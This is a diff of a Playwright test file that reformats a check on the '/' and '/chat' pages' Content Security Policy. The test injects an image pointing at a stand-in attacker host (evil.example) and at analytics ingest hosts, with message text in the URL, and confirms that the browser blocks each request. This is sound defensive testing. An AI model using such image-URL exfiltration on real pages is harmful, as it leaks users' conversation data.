@@ -44,97 +44,94 @@ function allows(sources: string[], url: string, pageOrigin: string): boolean {
 }
 
 for (const path of ['/', '/chat']) {
-	test(
-		`${path} loads images and media only from hosts its CSP names, and refuses an image pointed anywhere else`,
-		{ tag: ['@CUR-1898'] },
-		async ({ page }) => {
-			test.setTimeout(90_000);
-			const requested: { type: string; url: string }[] = [];
-			page.on('request', (request) => {
-				const type = request.resourceType();
-				if (type === 'image' || type === 'media') requested.push({ type, url: request.url() });
-			});
-			// Chromium raises `request` even for one the CSP stops, then fails it with
-			// a failure Playwright names "csp"; only that failure means nothing left the browser.
-			const outcome = new Map<string, string>();
-			page.on('requestfailed', (request) =>
-				outcome.set(request.url(), request.failure()?.errorText ?? 'failed')
-			);
-			page.on('requestfinished', (request) => outcome.set(request.url(), 'finished'));
+	test(`${path} loads images and media only from hosts its CSP names, and refuses an image pointed anywhere else`, async ({
+		page
+	}) => {
+		test.setTimeout(90_000);
+		const requested: { type: string; url: string }[] = [];
+		page.on('request', (request) => {
+			const type = request.resourceType();
+			if (type === 'image' || type === 'media') requested.push({ type, url: request.url() });
+		});
+		// Chromium raises `request` even for one the CSP stops, then fails it with
+		// a failure Playwright names "csp"; only that failure means nothing left the browser.
+		const outcome = new Map<string, string>();
+		page.on('requestfailed', (request) =>
+			outcome.set(request.url(), request.failure()?.errorText ?? 'failed')
+		);
+		page.on('requestfinished', (request) => outcome.set(request.url(), 'finished'));
 
-			const policy = await policyOf(page, path);
-			const imgSrc = sourcesFor(policy, 'img-src');
-			const mediaSrc = sourcesFor(policy, 'media-src');
-			expect(imgSrc, `no img-src in ${path}'s CSP: "${policy}"`).not.toHaveLength(0);
-			expect(mediaSrc, `no media-src in ${path}'s CSP: "${policy}"`).not.toHaveLength(0);
-			expect(imgSrc, 'a bare https: or * in img-src lets any host through').not.toContain('*');
-			expect(imgSrc).not.toContain('https:');
+		const policy = await policyOf(page, path);
+		const imgSrc = sourcesFor(policy, 'img-src');
+		const mediaSrc = sourcesFor(policy, 'media-src');
+		expect(imgSrc, `no img-src in ${path}'s CSP: "${policy}"`).not.toHaveLength(0);
+		expect(mediaSrc, `no media-src in ${path}'s CSP: "${policy}"`).not.toHaveLength(0);
+		expect(imgSrc, 'a bare https: or * in img-src lets any host through').not.toContain('*');
+		expect(imgSrc).not.toContain('https:');
 
-			const origin = new URL(page.url()).origin;
+		const origin = new URL(page.url()).origin;
+		expect(
+			requested.length,
+			`${path} loaded no images, so the allowlist check proves nothing`
+		).toBeGreaterThan(0);
+		for (const { type, url } of requested) {
 			expect(
-				requested.length,
-				`${path} loaded no images, so the allowlist check proves nothing`
-			).toBeGreaterThan(0);
-			for (const { type, url } of requested) {
-				expect(
-					allows(type === 'media' ? mediaSrc : imgSrc, url, origin),
-					`${path} requested ${type} ${url}, which its CSP does not allow`
-				).toBe(true);
-			}
-
-			// The case the policy exists for: an <img> naming another host, carrying data in its URL.
-			// The control image beside it is our own, so a pass cannot come from injection not working.
-			// Every PostHog Cloud region's ingest host, since the CSP allows each for fetches while the
-			// move to EU settles (config/posthogRegion.mjs CLOUD_HOSTS); none may load an image.
-			const ingestHosts = CLOUD_HOSTS.filter((h) => !h.includes('-assets.')).map(
-				(h) => new URL(h).host
-			);
-			const result = await page.evaluate(async (ingestHosts) => {
-				const violations: string[] = [];
-				document.addEventListener('securitypolicyviolation', (event) => {
-					violations.push(`${event.effectiveDirective} ${event.blockedURI}`);
-				});
-				const load = (src: string) =>
-					new Promise<boolean>((resolve) => {
-						const img = document.createElement('img');
-						img.onload = () => resolve(true);
-						img.onerror = () => resolve(false);
-						img.src = src;
-						document.body.append(img);
-					});
-				const remote = await load('https://evil.example/x.png?d=earlier-message-text');
-				// An analytics ingest host records an event sent as an image's query string, so it
-				// counts as another host however familiar it looks.
-				for (const host of ingestHosts) await load(`https://${host}/e/?data=earlier-message-text`);
-				const own = await load('/favicon.svg');
-				return { remote, own, violations };
-			}, ingestHosts);
-			expect(
-				result.own,
-				'our own /favicon.svg did not load, so the injection itself is broken'
+				allows(type === 'media' ? mediaSrc : imgSrc, url, origin),
+				`${path} requested ${type} ${url}, which its CSP does not allow`
 			).toBe(true);
-			expect(result.remote, 'the remote image loaded').toBe(false);
-			// PostHog answers with JSON, so this image fails to load either way; the violation below is what
-			// shows the request never left.
-			for (const host of ingestHosts) {
-				expect(
-					result.violations.some((v) => v.startsWith(`img-src https://${host}`)),
-					`the browser did not report an img-src violation for ${host}: ${JSON.stringify(result.violations)}`
-				).toBe(true);
-			}
-			expect(
-				result.violations.some((v) => v.startsWith('img-src https://evil.example')),
-				`the browser did not report an img-src violation for evil.example: ${JSON.stringify(result.violations)}`
-			).toBe(true);
-			for (const { url } of requested.filter(({ url }) =>
-				['evil.example', ...ingestHosts].includes(new URL(url).host)
-			)) {
-				await expect
-					.poll(() => outcome.get(url), {
-						message: `${url} was not stopped by the CSP before it left the browser`
-					})
-					.toBe('csp');
-			}
 		}
-	);
+
+		// The case the policy exists for: an <img> naming another host, carrying data in its URL.
+		// The control image beside it is our own, so a pass cannot come from injection not working.
+		// Every PostHog Cloud region's ingest host, since the CSP allows each for fetches while the
+		// move to EU settles (config/posthogRegion.mjs CLOUD_HOSTS); none may load an image.
+		const ingestHosts = CLOUD_HOSTS.filter((h) => !h.includes('-assets.')).map(
+			(h) => new URL(h).host
+		);
+		const result = await page.evaluate(async (ingestHosts) => {
+			const violations: string[] = [];
+			document.addEventListener('securitypolicyviolation', (event) => {
+				violations.push(`${event.effectiveDirective} ${event.blockedURI}`);
+			});
+			const load = (src: string) =>
+				new Promise<boolean>((resolve) => {
+					const img = document.createElement('img');
+					img.onload = () => resolve(true);
+					img.onerror = () => resolve(false);
+					img.src = src;
+					document.body.append(img);
+				});
+			const remote = await load('https://evil.example/x.png?d=earlier-message-text');
+			// An analytics ingest host records an event sent as an image's query string, so it
+			// counts as another host however familiar it looks.
+			for (const host of ingestHosts) await load(`https://${host}/e/?data=earlier-message-text`);
+			const own = await load('/favicon.svg');
+			return { remote, own, violations };
+		}, ingestHosts);
+		expect(result.own, 'our own /favicon.svg did not load, so the injection itself is broken').toBe(
+			true
+		);
+		expect(result.remote, 'the remote image loaded').toBe(false);
+		// PostHog answers with JSON, so this image fails to load either way; the violation below is what
+		// shows the request never left.
+		for (const host of ingestHosts) {
+			expect(
+				result.violations.some((v) => v.startsWith(`img-src https://${host}`)),
+				`the browser did not report an img-src violation for ${host}: ${JSON.stringify(result.violations)}`
+			).toBe(true);
+		}
+		expect(
+			result.violations.some((v) => v.startsWith('img-src https://evil.example')),
+			`the browser did not report an img-src violation for evil.example: ${JSON.stringify(result.violations)}`
+		).toBe(true);
+		for (const { url } of requested.filter(({ url }) =>
+			['evil.example', ...ingestHosts].includes(new URL(url).host)
+		)) {
+			await expect
+				.poll(() => outcome.get(url), {
+					message: `${url} was not stopped by the CSP before it left the browser`
+				})
+				.toBe('csp');
+		}
+	});
 }
